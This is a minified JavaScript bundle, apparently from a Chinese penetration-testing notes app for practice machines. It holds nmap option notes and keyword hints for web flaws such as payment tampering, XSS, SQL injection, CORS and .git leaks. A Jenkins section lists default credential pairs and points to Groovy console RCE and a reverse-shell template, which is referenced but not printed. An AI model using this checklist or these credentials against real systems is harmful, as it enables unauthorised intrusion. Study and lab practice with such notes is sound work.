-v3 -d -oA <\u8F93\u51FA\u6587\u4EF6\u65E0\u540E\u7F00\u540D\uFF0C\u652F\u6301\u76F8\u5BF9\u8DEF\u5F84> <IP\u5730\u5740>  --script all --script-args=vulns.showall <IP\u5730\u5740> ","			\u3010--script-args=\u3011\u4F20\u9012\u53C2\u6570 \uFF08\u539F\u4E66\u4E0A\u63CF\u8FF0\u6709\u9519\u8BEF\uFF0C\u81EA\u5DF1\u624B\u52A8\u6539\u6B63\uFF09","			\u3010--script\u3011\u597D\u50CF\u6CA1\u6709\u63D0\u5230\u662F\u5E72\u4EC0\u4E48\u7684\uFF1F","		\u6210\u529F\u4F8B\u5B50\uFF1A","			\u626B\u63CF\u3010zhihu.com\u3011\uFF0C\u603B\u8017\u65F68062.88\u79D2\u5DE6\u53F3\u3002","	Lua\u811A\u672C\uFF0C\u4E66\u5199NSE\uFF1A","		\u4FDD\u5B58\u5230 /usr/share/nmap/scripts \u76EE\u5F55 \uFF08\u6240\u6709NSE\u811A\u672C\u90FD\u5728\u8FD9\u91CC\uFF09"," "))},{name:"\u5176\u5B83\u5E38\u89C1\u9009\u9879",content:t.a.createElement(t.a.Fragment,null,e.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u3010-p<\u5F00\u59CB\u7AEF\u53E3>-<\u7ED3\u675F\u7AEF\u53E3>\u3011
              \u6307\u5B9A\u7AEF\u53E3\u8303\u56F4

              \u3010-p-\u3011
                  \u5168\u7AEF\u53E3\uFF0C\u6307\uFF1A\u7AEF\u53E3\u4ECE 1 \u5230 65535

          \u3010-v\u3011\uFF0C\u6253\u5370verbose\u7EA7\u522B\u65E5\u5FD7
              \u3010-vv\u3011\uFF0C\u6253\u5370 \u6BD4verbose \u66F4 verbose\u7684\u65E5\u5FD7

          \u3010-iL\u3011
              \uFF08InputList\uFF09
              \u4ECE\u6587\u4EF6\u4E2D\uFF0C\u8BFB\u53D6\u3010\u8D44\u4EA7\u5217\u8868\u3011

          \u3010-sU\u3011\uFF0CUDP\u626B\u63CF

          \u3010-sT\u3011\uFF0CTCP\u626B\u63CF\uFF08\u867D\u7136\u9ED8\u8BA4\u5C31\u662F\uFF09

          \u3010-sS\u3011
              \u4F7F\u7528\u3010TCP/SYN\u3011\uFF0C\u75D5\u8FF9\u66F4\u52A0\u4E0D\u660E\u663E
              \u6548\u679C\u662F\uFF1A\u66F4\u52A0\u79D8\u5BC6\u7684\u626B\u63CF\uFF0C\u66F4\u52A0\u9690\u79D8


          \u3010-sC\u3011\uFF0C\u2013script=default
              \u9ED8\u8BA4\u811A\u672C\u626B\u63CF \uFF08\u9ED8\u8BA4\u811A\u672C\u96C6\uFF09

          \u3010--script  <\u6307\u5B9A\u811A\u672C\u540D>\u3011
              \u53EF\u4EE5\u6307\u5B9A\uFF0C\u7528\u3010\u6307\u5B9A\u811A\u672C\u540D\u3011\u8FDB\u884C\u626B\u63CF
              \u5E38\u7528\u811A\u672C\uFF1A
                  \u3010vuln\u3011
                  \u652F\u6301\u901A\u914D\u7B26\uFF1A
                      \u5F62\u5982\u3010smb-vuln-*\u3011

          \u3010-sn\u3011\uFF0C\u4E0D\u8FDB\u884C\u7AEF\u53E3\u626B\u63CF
              \u6709\u4E9B\u60C5\u51B5\u4E0B\uFF0C\u7C7B\u4F3C\u4E8E\u3010ping\u626B\u63CF\u3011\u7684\u6548\u679C\u3002
              \u539F\u7406\uFF1A
                  \u5C06\u6240\u6709\u4E3B\u673A\u89C6\u4E3A\u3010\u5728\u7EBF\u3011\u3002\u8DF3\u8FC7\u4E86 \u4E3B\u673A\u53D1\u73B0 \u7684\u73AF\u8282\u3002

          \u3010--open\u3011
              \u53EA\u5C55\u793A\uFF0C\u3010\u5F00\u653E\u3011\u7684\u7AEF\u53E3\u3002

          \u3010--min-rate <\u5177\u4F53\u503C>\u3011
              \u624B\u52A8\u6307\u5B9A\u3010\u626B\u63CF\u9891\u7387\u3011
                  \u5BF9\u4E8E\u3010\u65E0\u9632\u706B\u5899 \u65E0WAF\u3011\u4EA7\u54C1\uFF0C\u5982\u9776\u673A\uFF0C\u53EF\u4EE5\u975E\u5E38\u5FEB

                  \u4F46\u5176\u5B83\u65F6\u5019\uFF0C\u5F88\u53D7\u5C40\u9650

          \u3010-oA <\u8F93\u51FA\u6587\u4EF6\u540D>\u3011\uFF0C\u7B49\u4E8E output all
              \u5BFC\u51FA\u6240\u67093\u79CD\u683C\u5F0F\u7684\u7ED3\u679C\u62A5\u544A


          \u3010-p  <\u6307\u5B9A\u7AEF\u53E3\u591A\u4E2A\u7528\u9017\u53F7\u5206\u9694>\u3011
              \u624B\u52A8\u6307\u5B9A\uFF0C\u626B\u63CF\u54EA\u4E9B\u7AEF\u53E3\u3002\uFF08\u5E38\u7528\u5728\u521D\u7B5B\u4E4B\u540E\u7684\u7CBE\u7EC6\u626B\u63CF\uFF09

          \u3010\u2013min-hostgroup\u3011
              \u7528\u4E8E\u6307\u5B9A Nmap \u5E94\u8BE5\u5E76\u884C\u626B\u63CF\u7684\u300A\u76EE\u6807\u300B\u7684\u6700\u5C0F\u6570\u91CF\u3002

          `))}]},E=m},q4c3:function(H,d,n){"use strict";n.d(d,"a",function(){return e});var S=n("q1tI"),t=n.n(S),l=n("ysNt"),r=[{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"\u767B\u5F55\u3001\u6CE8\u518C",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:l.l.get_regex_fromArrKeywords(["\u767B\u5F55","\u767B\u9646","\u6CE8\u518C"]),desc:"\u767B\u5F55\u903B\u8F91",koans_\u63D0\u793A:["\u5E38\u89C1\uFF1A\u9A8C\u8BC1\u7801","\u5E38\u89C1\uFF1A\u4EFB\u610F\u6CE8\u518C","\u5E38\u89C1\uFF1A\u4EFB\u610F\u627E\u56DE","\u5E38\u89C1\uFF1A\u4EFB\u610F\u91CD\u7F6E","\u5E38\u89C1\uFF1A\u91CD\u5B9A\u5411","\u5E38\u89C1\uFF1A\u6B65\u9AA4\u8DF3\u8FC7","\u5E38\u89C1\uFF1A","\u5E38\u89C1\uFF1A\u2026\u2026\u2026\u2026"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"\u652F\u4ED8",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:l.l.get_regex_fromArrKeywords(["\u652F\u4ED8"]),desc:"\u652F\u4ED8\u903B\u8F91",koans_\u63D0\u793A:["\u5E38\u89C1\uFF1A0\u5143","\u5E38\u89C1\uFF1A\u8D1F\u6570","\u5E38\u89C1\uFF1A\u91CD\u653E","\u5E38\u89C1\uFF1A\u968F\u673A\u591A\u6B21\u63620.01\u5143","\u5E38\u89C1\uFF1A\u2026\u2026\u2026\u2026"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"\u91CD\u5B9A\u5411",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:l.l.get_regex_fromArrKeywords(["\u91CD\u5B9A\u5411","redirect","return","url"]),desc:"\u91CD\u5B9A\u5411\u903B\u8F91",koans_\u63D0\u793A:["\u5E38\u89C1\uFF1A\u6267\u884Cjs\u4EE3\u7801","\u5E38\u89C1\uFF1A\u8DF3\u8F6C\u5176\u5B83\u7F51\u7AD9","\u5E38\u89C1\uFF1A\u2026\u2026\u2026\u2026"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"\u63D0\u4EA4\u5404\u79CD\u4FE1\u606F",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:l.l.get_regex_fromArrKeywords(["\u8BC4\u8BBA","\u7559\u8A00","\u56DE\u590D","\u5E16","\u8868\u5355","\u63D0\u4EA4","\u7533\u8BF7","\u8D44\u6599","\u4FE1\u606F"]),desc:"\u63D0\u4EA4\u5404\u79CD\u4FE1\u606F",koans_\u63D0\u793A:["\u5E38\u89C1\uFF1AXSS","\u5E38\u89C1\uFF1ASQL\u6CE8\u5165","\u5E38\u89C1\uFF1A\u2026\u2026\u2026\u2026"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"CORS\u8DE8\u57DF",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:l.l.get_regex_fromArrKeywords(["cors","\u8DE8\u57DF","xss"]),desc:"CORS\u8DE8\u57DF",koans_\u63D0\u793A:["\u53EF\u4EE5\uFF0C\u8BBF\u95EE\u7A83\u53D6\u654F\u611F\u4FE1\u606F","\u5E38\u89C1\uFF1A\u548C\u3010XSS\u3011\u7EC4\u5408\u5728\u4E00\u8D77\uFF0C\u5F62\u6210\u3010\u7EC4\u5408\u62F3\u3011\uFF0C\u76F4\u63A5\u7A83\u53D6\u654F\u611F\u4FE1\u606F\uFF0C\u53EF\u88AB\u5B9A\u4E3A\u9AD8\u5371",t.a.createElement("div",null,"\u53C2\u8003\u8D44\u6599\uFF1A",t.a.createElement("ol",null,t.a.createElement("li",null,l.l.singleATag_blank("\u53CD\u5C04XSS\u548CCORS\u6F0F\u6D1E\u7684\u7EC4\u5408\u62F3\u5F15\u53D1\u7684\u8840\u6848 - InfoQ \u5199\u4F5C\u5E73\u53F0","https://xie.infoq.cn/article/b8089e408ffa63fbc5d46d2a5")))),t.a.createElement("div",null,"\u76F8\u5173\u5DE5\u5177\uFF1A",t.a.createElement("ol",null,t.a.createElement("li",null,"\u5F00\u6E90\u5DE5\u5177 CrossSiteContentHijacking\uFF0C\u7528\u4E8E\u9A8C\u8BC1 CORS\u6F0F\u6D1E"))),"\u5E38\u89C1\uFF1A\u2026\u2026\u2026\u2026"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:".idea\u3001.git\uFF0C\u4FE1\u606F\u6CC4\u9732",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:l.l.get_regex_fromArrKeywords([".idea","idea",".git","git"]),desc:".idea\u4FE1\u606F\u6CC4\u9732",koans_\u63D0\u793A:[t.a.createElement("div",null,"\u3010.idea\u3011\u6CC4\u9732\u6316\u6398",t.a.createElement("ol",null,t.a.createElement("li",null,"\u5DE5\u5177\u4ECB\u7ECD\uFF1A",l.l.singleATag_blank(".idea \u6587\u4EF6\u5939\u6CC4\u9732\u5229\u7528\u5DE5\u5177 | \u674E\u52BC\u6770\u7684\u535A\u5BA2","http://www.lijiejie.com/idea-exploit/")),t.a.createElement("li",null,"\u5DE5\u5177\u4E0B\u8F7D\uFF1A",l.l.singleATag_blank("lijiejie/idea_exploit: \u6536\u96C6\u5DE5\u5177","https://github.com/lijiejie/idea_exploit"))))]}],e=[{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"\u3010.bak\u3011",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/.*\.bak/g,desc:"\u4EFB\u610F\u3010.bak\u3011\u540E\u7F00\u6587\u4EF6",koans_\u63D0\u793A:[]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"\u63A5\u53E3",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/接口/g,desc:"\u4EFB\u610F\u63A5\u53E3\u5730\u5740",koans_\u63D0\u793A:[]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"/etc/passwd",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/\/etc\/passwd/g,desc:"\u3010/etc/passwd\u3011\uFF0C\u5BC6\u7801\u6587\u4EF6",koans_\u63D0\u793A:[]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"colorlib",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/colorlib/g,desc:"\u3010colorlib\u3011\uFF0C\u662F\u3010WordPress\u3011\u7684\u4E00\u4E2A\u76F8\u5173\u4E3B\u9898\u3002",koans_\u63D0\u793A:["\u68C0\u67E5\u3010WordPress\u3011"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"\u57DF",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/域/g,desc:"\u3010\u57DF\u3011\uFF0C\u7F51\u7EDC\u7ED3\u6784\u4E2D\u7684\u4E00\u79CD\uFF0C\u590D\u6742\u7684 \u7EC4\u7EC7\u7ED3\u6784 \u3002",koans_\u63D0\u793A:["\u4F7F\u7528\u3010BloodHound\u3011\u5BFB\u8840\u730E\u72AC"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"nmap",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/nmap/g,desc:"nmap\u626B\u63CF\uFF0C\u6709\u591A\u79CD\u65B9\u5F0F\uFF0CTCP\u3001UDP",koans_\u63D0\u793A:["nmap\u626B\u63CF\uFF0C\u4F7F\u7528TCP\u626B\u63CF\u540E\uFF0C\u5E94\u518D\u8FDB\u884C\u4E00\u6B21 \u3010UDP\u3011 \u626B\u63CF\u3002","	\u53EF\u80FD\u4F1A\u5F97\u5230\uFF0C\u622A\u7136\u4E0D\u540C\u7684\u7ED3\u679C"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:".action .do",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/(\.action|\.do)/g,desc:"\u6846\u67B6\u5E73\u53F0",koans_\u63D0\u793A:["Java\u8BED\u8A00","\u6846\u67B6\u5E73\u53F0\uFF0C\u53EF\u80FD\u662FWebLogic","\u3010.action\u3011\u7248\u672C\u6BD4\u8F83\u8001\u4E00\u70B9\uFF0C\u3010.do\u3011\u7248\u672C\u6BD4\u8F83\u65B0\u4E00\u70B9"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"names.nsf",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/names\.nsf/g,desc:"\u6846\u67B6\uFF0C\u8DEF\u7531\u63A7\u5236",koans_\u63D0\u793A:["\u7ECF\u5E38\u6709\u3010names.nsf?Login\u3011\u3001\u3010names.nsf?Logout\u3011\uFF0C\u8FD9\u6837\u7684\u3002","\u4F3C\u4E4E\u548C\u3010IBM Lotus Notes\u3011\u6709\u5173\uFF1B\u8FD9\u662F\u4E00\u4E2A IBM \u7684\u90AE\u4EF6\u5BA2\u6237\u7AEF\u3002"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:".ashx",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/\.ashx/g,desc:"\u6846\u67B6\u5E73\u53F0",koans_\u63D0\u793A:["\u6846\u67B6\u5E73\u53F0\uFF0C\u4E0D\u77E5\u9053\u662F\u4EC0\u4E48\u5E73\u53F0\uFF1F"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"FreeMarker",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/FreeMarker/g,desc:"JSX\u7684\u524D\u7AEF\u6A21\u677F\u6E32\u67D3",koans_\u63D0\u793A:["JSX\u7684\u524D\u7AEF\u6A21\u677F\u6E32\u67D3"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:".aspx",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/\.aspx/g,desc:"ASP\u548C.NET",koans_\u63D0\u793A:["ASP\u548C.NET"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"WEB-INF\u3001web.xml",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/(WEB-INF|web\.xml)/g,desc:"Apache\u670D\u52A1\u5668\u76F8\u5173\u6587\u4EF6",koans_\u63D0\u793A:["Apache\u670D\u52A1\u5668\uFF0C\u4E00\u4E9B\u63CF\u8FF0\u6027\u7684\u6587\u4EF6\u3001\u548C\u914D\u7F6E\u6587\u4EF6","\u5305\u62EC\u3010Servlet\u76F8\u5173\u3011"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"ESAPI.properties",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/(ESAPI|validation)(\.properties)?/g,desc:"ES\u76F8\u5173\u7684API\uFF08Enterprise Security\uFF09\uFF0C\u4E00\u4E9B\u914D\u7F6E\u6587\u4EF6",koans_\u63D0\u793A:["\u3010ESAPI.properties\u3011\uFF0C\u3010OWASP Enterprise Security API\u3011\u76F8\u5173\u7684\u914D\u7F6E\u6587\u4EF6","\u5176\u5B83\u4E00\u4E9B\u2026\u2026\u2026\u2026"]}].concat(r)},qhoQ:function(H,d,n){"use strict";n.d(d,"b",function(){return p}),n.d(d,"c",function(){return I}),n.d(d,"a",function(){return g});var S=n("jrin"),t=n("k1fw"),l=n("oBTY"),r=n("fWQN"),e=n("mtLc"),u=n("ty9a"),m=n.n(u),E=n("nE81"),F=n("Erke"),p=function(){function c(){Object(r.a)(this,c)}return Object(e.a)(c,null,[{key:"\u5904\u7406\u591A\u97F3\u5B57____\u5927\u5C0F\u5199\u654F\u611F",value:function(w){for(var a=arguments.length,B=new Array(a>1?a-1:0),O=1;O<a;O++)B[O-1]=arguments[O];var _=m.a.spell.apply(m.a,[w,"array","poly"].concat(B)),b=_.map(function(j){var v=j.match(/[^()|]+/g);return v===null?[j]:v}),y=F.c.apply(void 0,Object(l.a)(b));return y.map(function(j){return j.join("")})}},{key:"getPinYin_Spell____\u5927\u5C0F\u5199\u654F\u611F",value:function(w){return{pinyin_arr:this.\u5904\u7406\u591A\u97F3\u5B57____\u5927\u5C0F\u5199\u654F\u611F(w),firstPinyin_arr:this.\u5904\u7406\u591A\u97F3\u5B57____\u5927\u5C0F\u5199\u654F\u611F(w,"first","low")}}},{key:"_check_\u5305\u542B\u4E2D\u6587\u548C\u4E2D\u6587\u7684\u591A\u97F3\u5B57_\u662F\u5426\u5305\u542B____\u5185\u90E8\u5DF2\u5904\u7406\u5927\u5C0F\u5199",value:function(w,a){var B=this,O=this.getPinYin_Spell____\u5927\u5C0F\u5199\u654F\u611F(a),_=O.pinyin_arr,b=_.some(function(y){return B._check_\u662F\u5426\u5305\u542B_\u975E\u8FDE\u7EED\u6BD4\u8F83_\u4E2D\u95F4\u53EF\u6709\u5176\u5B83\u5B57\u7B26____\u5185\u90E8\u5DF2\u5904\u7406\u5927\u5C0F\u5199(w,[y])});return b}},{key:"_check_\u662F\u5426\u5305\u542B_\u975E\u8FDE\u7EED\u6BD4\u8F83_\u4E2D\u95F4\u53EF\u6709\u5176\u5B83\u5B57\u7B26____\u5185\u90E8\u5DF2\u5904\u7406\u5927\u5C0F\u5199",value:function(w,a){return Object(E.a)(a,w,!0).length>0}}]),c}(),I={\u751F\u6D3B\u6587\u672C_\u81EA\u52A8:!0,\u6E17\u900F\u9776\u673A_\u81EA\u52A8:!0},g=function(){function c(){Object(r.a)(this,c)}return Object(e.a)(c,null,[{key:"\u5904\u7406\u62FC\u97F3\u90E8\u5206_key\u5C06\u4F1A\u81EA\u52A8\u8F6C\u5316\u4E3A\u5C0F\u5199",value:function(w){var a=this,B=w.reduce(function(O,_){var b=_.toLowerCase();if(a.pinyin_map__\u4E13\u7528\u4E8E\u7591\u96BE\u6742\u75C7_\u7EDF\u4E00\u5171\u7528\u4E00\u4EFD[b]!==void 0)return O;var y=p.getPinYin_Spell____\u5927\u5C0F\u5199\u654F\u611F(b),j=y.pinyin_arr,v=y.firstPinyin_arr,x=j.map(function(R){return R.toLowerCase()}),T=v.map(function(R){return R.toLowerCase()});return Object(t.a)(Object(t.a)({},O),{},Object(S.a)({},b,{raw_\u4FDD\u7559\u5927\u5C0F\u5199:_,raw_lower:b,pinyin_str_arr_lower:x,firstPinyin_str_arr_lower:T}))},{});this.pinyin_map__\u4E13\u7528\u4E8E\u7591\u96BE\u6742\u75C7_\u7EDF\u4E00\u5171\u7528\u4E00\u4EFD=Object(t.a)(Object(t.a)({},this.pinyin_map__\u4E13\u7528\u4E8E\u7591\u96BE\u6742\u75C7_\u7EDF\u4E00\u5171\u7528\u4E00\u4EFD),B)}},{key:"\u6BD4\u8F83_\u8FDE\u7EED\u62FC\u97F3",value:function(w,a){var B,O,_,b,y=((B=this.pinyin_map__\u4E13\u7528\u4E8E\u7591\u96BE\u6742\u75C7_\u7EDF\u4E00\u5171\u7528\u4E00\u4EFD)===null||B===void 0||(O=B[w])===null||O===void 0?void 0:O.pinyin_str_arr_lower)||[],j=((_=this.pinyin_map__\u4E13\u7528\u4E8E\u7591\u96BE\u6742\u75C7_\u7EDF\u4E00\u5171\u7528\u4E00\u4EFD)===null||_===void 0||(b=_[a])===null||b===void 0?void 0:b.pinyin_str_arr_lower)||[];return y.find(function(v){return j.find(function(x){return v.includes(x)})})!==void 0}},{key:"\u6BD4\u8F83_\u62FC\u97F3\u9996\u5B57\u6BCD",value:function(w,a){var B,O,_,b,y=((B=this.pinyin_map__\u4E13\u7528\u4E8E\u7591\u96BE\u6742\u75C7_\u7EDF\u4E00\u5171\u7528\u4E00\u4EFD)===null||B===void 0||(O=B[w])===null||O===void 0?void 0:O.firstPinyin_str_arr_lower)||[],j=((_=this.pinyin_map__\u4E13\u7528\u4E8E\u7591\u96BE\u6742\u75C7_\u7EDF\u4E00\u5171\u7528\u4E00\u4EFD)===null||_===void 0||(b=_[a])===null||b===void 0?void 0:b.firstPinyin_str_arr_lower)||[];return y.find(function(v){return j.find(function(x){return v.includes(x)})})!==void 0}},{key:"\u4EFB\u610F\u6BD4\u8F83_\u901A\u8FC7\u7B2C\u4E09\u65B9\u5E93\u5224\u65AD",value:function(w,a){var B,O,_,b,y=((B=this.pinyin_map__\u4E13\u7528\u4E8E\u7591\u96BE\u6742\u75C7_\u7EDF\u4E00\u5171\u7528\u4E00\u4EFD)===null||B===void 0||(O=B[w])===null||O===void 0?void 0:O.pinyin_str_arr_lower)||[],j=((_=this.pinyin_map__\u4E13\u7528\u4E8E\u7591\u96BE\u6742\u75C7_\u7EDF\u4E00\u5171\u7528\u4E00\u4EFD)===null||_===void 0||(b=_[a])===null||b===void 0?void 0:b.pinyin_str_arr_lower)||[];return j.find(function(v){var x=Object(E.a)(y,v);return x.length>0})!==void 0}},{key:"\u8BA1\u7B97__\u4E2D\u6587_\u82F1\u6587__\u4E0D\u540C\u7684\u957F\u5EA6",value:function(w){for(var a=0,B=0,O=0,_=0,b=0;b<w.length;b++){var y=w.charAt(b);(y.match(/[\u4e00-\u9fa5]/)||y.match(/[\u9FA6-\u9fcb]/))&&a++,y.match(/[^\x00-\xff]/)?B++:O++,y.match(/[0-9]/)&&_++}var j=a,v=j-B,x=_,T=x+j,R=B-j,s=O-x,o=j*2+R*2+O;return{\u4E2D\u6587\u6C49\u5B57\u6570:j,\u4E2D\u6587\u5168\u89D2\u6807\u70B9:v,\u6570\u5B57:x,\u4E2D\u6587\u5185\u5BB9\u603B\u6570___\u6C49\u5B57\u52A0\u6570\u5B57:T,\u4E2D\u6587_\u6807\u70B9:R,\u7EAF\u82F1\u6587\u5B57\u6BCD:s,ASCII\u5B57\u7B26\u603B\u6570:o}}}]),c}();g.pinyin_map__\u4E13\u7528\u4E8E\u7591\u96BE\u6742\u75C7_\u7EDF\u4E00\u5171\u7528\u4E00\u4EFD={}},qtNK:function(H,d,n){"use strict";n.d(d,"a",function(){return p});var S=n("tJVT"),t=n("q1tI"),l=n.n(t),r=n("/qoP"),e=n("ysNt"),u=n("s1IG"),m=n("jJ7j"),E=e.l.singleATag_blank,F={name:"\u3010Jenkins\u3011_\u624B\u518C",steps:[{name:"\u767B\u5F55",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,m.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u9ED8\u8BA4\u8D26\u53F7\u5BC6\u7801 \u3001 credentials\u51ED\u8BC1
              \u53C2\u8003\u8D44\u6599\uFF1A
                  \u9ED8\u8BA4\u8D26\u53F7\u5BC6\u78011\uFF1Ahttps://www.login-faq.com/jenkins-default-username-and-password/
                  \u9ED8\u8BA4\u8D26\u53F7\u5BC6\u78012\uFF1Ahttps://www.login-faq.com/jenkins-default-username-and-password/#2
                  \u9ED8\u8BA4\u8D26\u53F7\u5BC6\u78013\uFF1Ahttps://treehozz.com/what-is-the-default-jenkins-password
                  \u9ED8\u8BA4\u8D26\u53F7\u5BC6\u78014\uFF1Ahttps://docs.openshift.com/container-platform/3.3/using_images/other_images/jenkins.html

              \u7F51\u4E0A\u666E\u904D\u7ED9\u51FA\u7684\uFF1A
                  admin/password

              HTB\u7ED9\u51FA\u7684\uFF1A
                  admin:password
                  admin:admin
                  root:root
                  root:password
                  admin:admin1
                  admin:password1
                  root:password1

          `))},{name:"\u5E38\u89C1\u3010\u5229\u7528\u6D41\u7A0B\u3011\u7684\u793A\u4F8B\uFF0C\u4F9B\u53C2\u8003",desc:l.a.createElement(l.a.Fragment,null),content:Promise.all([Promise.resolve().then(n.bind(null,"2jYT"))]).then(function(I){var g=Object(S.a)(I,1),c=g[0];return l.a.createElement(l.a.Fragment,null,m.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u793A\u4F8B\u7B2C\u4E00\u79CD\uFF1A
              gquere/pwn_jenkins\uFF1A\u5173\u4E8E\u653B\u51FB Jenkins \u670D\u52A1\u5668\u7684\u6CE8\u610F\u4E8B\u9879
                  https://github.com/gquere/pwn_jenkins

          \u793A\u4F8B\u7B2C\u4E8C\u79CD\uFF1A
          `,u.a.Jenkins,`


          \u793A\u4F8B\u7B2C\u4E09\u79CD\uFF1A
              Jenkins - Pentest Book
                  https://pentestbook.six2dez.com/enumeration/webservices/jenkins
`,`
          \u6210\u719F\u65B9\u6848\uFF1A
              \u4F7F\u7528\u3010Groovy Script\u3011\uFF0C\u5728\u3010Script Console\u3011\u4E2D
                  \u4F7F\u7528\u573A\u666F\uFF1A
                      (\u539F\u672C)\u5E38\u7528\u4E8E\uFF0C\u3010\u6545\u969C\u8C03\u8BD5\u3011\u548C\u3010\u6545\u969C\u8BCA\u65AD\u3011

`,Object(r.d)({\u667A\u80FD\u6B65\u9AA4_cfg:c.Shell_ReverseShell_\u53CD\u5411\u4EE3\u7406_\u624B\u518C}),`
          \u96F6\u788E\uFF1A
              \u5229\u7528 Groovy \uFF0C\u5B9E\u73B0 RCE
                  \u8D44\u6599\uFF1Ahttps://0xdf.gitlab.io/2019/02/27/playing-with-jenkins-rce-vulnerability.html

            `,`
          \u5982\u679C\u662FLinux\uFF0C\u53EF\u80FD\u8981\u5C06\u3010cmd\u3011\u6539\u6210\u3010/bin/bash\u3011\u3002
                `))})}]},p=F},s1IG:function(H,d,n){"use strict";n.d(d,"b",function(){return h}),n.d(d,"a",function(){return w});var S=n("fWQN"),t=n("5NDa"),l=n("5rEg"),r=n("k1fw"),e=n("tJVT"),u=n("q1tI"),m=n.n(u),E=n("be4S"),F=n("ysNt"),p={};function I(a){return p[a]||(p[a]=new E.a("Hack_Cp____"+a)),p[a]}function g(a,B){var O=encodeURIComponent(a);return B?Object(F.o)(B,O):m.a.createElement("pre",null,O)}function c(a,B){var O=encodeURI(a);return B?Object(F.o)(B,O):m.a.createElement("pre",null,O)}var h=function(B){var O=B.special_name,_=B.var_names_arr,b=B.code_template_arr,y=B.gen_str_transfer_fn,j=I(O),v=Object(u.useState)(j.loadData____\u5141\u8BB8\u90E8\u5206\u6570\u636E\u6B8B\u7F3A()),x=Object(e.a)(v,2),T=x[0],R=x[1],s=function(){return b.map(function(o){var i=o;return _.forEach(function(f){var P;i=i.replaceAll("###<".concat(f,">###"),(P=T[f])!==null&&P!==void 0?P:"\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u